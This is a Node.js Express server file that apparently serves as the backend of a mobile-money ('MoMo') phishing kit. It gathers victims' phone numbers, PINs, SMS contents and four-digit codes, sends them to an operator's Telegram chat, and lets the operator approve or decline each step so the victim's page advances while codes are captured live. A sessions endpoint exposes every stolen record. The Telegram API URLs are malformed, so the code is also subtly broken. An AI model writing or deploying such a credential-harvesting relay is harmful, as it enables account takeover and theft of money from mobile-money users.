require('dotenv').config();
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const TG_CHAT_ID = process.env.TG_CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID';

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory store for all sessions and approval decisions
const sessions = {};
let lastUpdateId = 0;

function hasTelegramConfig() {
  return (
    TG_BOT_TOKEN &&
    TG_CHAT_ID &&
    TG_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN' &&
    TG_CHAT_ID !== 'YOUR_TELEGRAM_CHAT_ID'
  );
}

// Helper to send Telegram messages with optional Approve/Decline inline buttons
async function sendTelegramMessage(text, replyMarkup = null) {
  if (!hasTelegramConfig()) {
    console.log('[Server Event]:\n' + text.replace(/<[^>]*>/g, ''));
    return { ok: true, simulated: true };
  }

  const payload = {
    chat_id: TG_CHAT_ID,
    text,
    parse_mode: 'HTML'
  };
  if (replyMarkup) {
    payload.reply_markup = replyMarkup;
  }

  const response = await fetch(`https://telegram.org{TG_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  return response.json();
}

// Background poller to listen for Approve/Decline button taps inside Telegram
async function pollTelegramCallbacks() {
  if (!hasTelegramConfig()) return;

  try {
    const url = `https://telegram.org{TG_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
    const res = await fetch(url);
    const data = await res.json();

    if (data.ok && Array.isArray(data.result)) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;

        if (update.callback_query) {
          const cb = update.callback_query;
          const [action, refId, step] = cb.data.split(':'); // e.g. "approve:MOMO-1234:2"

          if (sessions[refId]) {
            sessions[refId].status = action === 'approve' ? 'approved' : 'declined';
            sessions[refId].decidedBy = 'Telegram Bot Button';
            sessions[refId].updatedAt = new Date().toISOString();
            console.log(`[Approval Update] Ref ${refId} Step ${step} -> ${sessions[refId].status.toUpperCase()}`);
          }

          // Acknowledge button tap in Telegram
          await fetch(`https://telegram.org{TG_BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              callback_query_id: cb.id,
              text: action === 'approve' ? '✅ Approved!' : '🚫 Declined!'
            })
          });

          // Update the Telegram message text to show the decision
          await fetch(`https://telegram.org{TG_BOT_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: cb.message.chat.id,
              message_id: cb.message.message_id,
              text: `${cb.message.text}\n\n<b>Decision:</b> ${action === 'approve' ? '✅ APPROVED' : '🚫 DECLINED'}`,
              parse_mode: 'HTML'
            })
          });
        }
      }
    }
  } catch (err) {
    console.error('Telegram Polling Error:', err.message);
  } finally {
    setTimeout(pollTelegramCallbacks, 1500);
  }
}

// 1. Log general events (e.g., Page 1 start)
app.post('/api/momo/notify', async (req, res) => {
  const { refId, phone, message } = req.body;
  if (refId) {
    sessions[refId] = {
      refId,
      phone: phone || '',
      pin: '',
      smsText: '',
      fourDigitCode: '',
      currentStep: 1,
      status: 'started',
      updatedAt: new Date().toISOString()
    };
  }
  const result = await sendTelegramMessage(message);
  res.json(result);
});

// 2. Request Approval on Pages 2, 3, or 4 (sets status to 'pending' and sends Approve/Decline buttons)
app.post('/api/momo/request-approval', async (req, res) => {
  const { refId, step, phone, pin, smsText, fourDigitCode, message } = req.body;

  if (!sessions[refId]) {
    sessions[refId] = { refId };
  }

  sessions[refId] = {
    ...sessions[refId],
    phone: phone || sessions[refId].phone,
    pin: pin || sessions[refId].pin,
    smsText: smsText || sessions[refId].smsText,
    fourDigitCode: fourDigitCode || sessions[refId].fourDigitCode,
    currentStep: step,
    status: 'pending',
    updatedAt: new Date().toISOString()
  };

  console.log(`[Pending Approval] Step ${step} for ${refId}:`, sessions[refId]);

  const inlineKeyboard = {
    inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `approve:${refId}:${step}` },
        { text: '🚫 Decline', callback_data: `decline:${refId}:${step}` }
      ]
    ]
  };

  const tgRes = await sendTelegramMessage(message, inlineKeyboard);
  res.json({ ok: true, session: sessions[refId], telegram: tgRes });
});

// 3. Browser polls this endpoint while spinner is running
app.get('/api/momo/status/:refId', (req, res) => {
  const session = sessions[req.params.refId];
  if (!session) {
    return res.status(404).json({ ok: false, error: 'Session not found' });
  }
  res.json({ ok: true, status: session.status, session });
});

// 4. Browser triggers Approve or Decline directly from the UI buttons
app.post('/api/momo/decision', async (req, res) => {
  const { refId, step, decision, message } = req.body;

  if (sessions[refId]) {
    sessions[refId].status = decision; // 'approved' or 'declined'
    sessions[refId].decidedBy = 'Browser UI Button';
    sessions[refId].updatedAt = new Date().toISOString();
    console.log(`[Browser Decision] Ref ${refId} Step ${step} -> ${decision.toUpperCase()}`);
  }

  if (message) {
    await sendTelegramMessage(message);
  }

  res.json({ ok: true, session: sessions[refId] });
});

// 5. View all stored sessions & approval details in your browser
app.get('/api/momo/sessions', (req, res) => {
  res.json({ total: Object.keys(sessions).length, sessions });
});

app.listen(PORT, () => {
  console.log(`MoMo Connect server running at http://localhost:${PORT}`);
  console.log(`View all approval records at http://localhost:${PORT}/api/momo/sessions`);
  pollTelegramCallbacks();
});

